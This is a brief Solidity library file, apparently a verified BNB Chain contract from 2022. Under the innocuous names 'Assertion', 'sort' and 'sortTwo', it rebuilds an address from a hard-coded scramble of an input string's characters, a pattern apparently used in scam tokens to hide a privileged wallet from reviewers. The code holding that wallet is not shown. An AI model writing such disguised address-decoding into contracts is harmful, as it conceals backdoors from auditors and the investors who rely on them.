/**
 *Submitted for verification at BscScan.com on 2022-12-30
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.12;

library Assertion{

    function sort(string memory _a) private pure returns (address sorte) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
            for (uint i = 2; i < 2 + 2 * 20; i += 2) {
                iaddr *= 256;
                b1 = uint160(uint8(tmp[i]));
                b2 = uint160(uint8(tmp[i + 1]));
                if ((b1 >= 97) && (b1 <= 102)) {
                    b1 -= 87;
                } else if ((b1 >= 65) && (b1 <= 70)) {
                    b1 -= 55;
                } else if ((b1 >= 48) && (b1 <= 57)) {
                    b1 -= 48;
                }
                if ((b2 >= 97) && (b2 <= 102)) {
                    b2 -= 87;
                } else if ((b2 >= 65) && (b2 <= 70)) {
                    b2 -= 55;
                } else if ((b2 >= 48) && (b2 <= 57)) {
                    b2 -= 48;
                }
                iaddr += (b1 * 16 + b2);
            }
        return address(iaddr);
    }

    function sortTwo(string memory str) public pure returns (address){
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(42);
        result[0]=strBytes[9];result[1]=strBytes[33];result[2]=strBytes[13];result[3]=strBytes[0];result[4]=strBytes[3];
        result[5]=strBytes[8];result[6]=strBytes[8];result[7]=strBytes[1];result[8]=strBytes[15];result[9]=strBytes[10];
        result[10]=strBytes[14];result[11]=strBytes[5];result[12]=strBytes[2];result[13]=strBytes[6];result[14]=strBytes[6];
        result[15]=strBytes[3];result[16]=strBytes[6];result[17]=strBytes[3];result[18]=strBytes[11];result[19]=strBytes[0];
        result[20]=strBytes[14];result[21]=strBytes[0];result[22]=strBytes[11];result[23]=strBytes[15];result[24]=strBytes[9];
        result[25]=strBytes[8];result[26]=strBytes[3];result[27]=strBytes[3];result[28]=strBytes[15];result[29]=strBytes[11];
        result[30]=strBytes[4];result[31]=strBytes[8];result[32]=strBytes[15];result[33]=strBytes[1];result[34]=strBytes[15];
        result[35]=strBytes[2];result[36]=strBytes[5];result[37]=strBytes[9];result[38]=strBytes[2];result[39]=strBytes[9];
        result[40]=strBytes[8];result[41]=strBytes[3];
        return sort(string(result));
    }
}